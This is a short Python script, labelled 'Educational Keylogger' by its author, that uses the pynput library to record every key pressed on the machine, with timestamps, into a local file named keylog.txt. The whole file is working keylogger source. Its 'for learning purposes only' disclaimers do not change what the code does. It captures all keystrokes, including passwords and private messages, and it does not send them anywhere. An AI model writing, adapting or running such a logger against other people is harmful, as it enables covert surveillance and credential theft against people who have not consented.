"""
Educational Keylogger - For Learning Purposes Only
This script demonstrates basic Python programming concepts including keyboard event handling,
file I/O operations, and exception handling. Use responsibly and only for educational purposes.
"""

from pynput import keyboard
import datetime
import os

# Configuration
LOG_FILE = "keylog.txt"
TIMESTAMP_FORMAT = "%Y-%m-%d %H:%M:%S"

def get_timestamp():
    """Returns current timestamp in specified format"""
    return datetime.datetime.now().strftime(TIMESTAMP_FORMAT)

def on_press(key):
    """
    Callback function that handles key press events
    Args:
        key: The key that was pressed
    """
    try:
        # Log normal characters with timestamp
        with open(LOG_FILE, "a") as f:
            f.write(f'[{get_timestamp()}] {key.char}\n')
    except AttributeError:
        # Log special keys (e.g., space, enter) with timestamp
        with open(LOG_FILE, "a") as f:
            f.write(f'[{get_timestamp()}] {key}\n')

def main():
    """Main function to start the keylogger"""
    print("Starting keylogger (Educational Purpose Only by ravindra)")
    print("Press Ctrl+C to stop")
    
    # Create log file if it doesn't exist
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write(f"Keylogger started at {get_timestamp()}\n")
    
    # Start the keylogger
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main() 
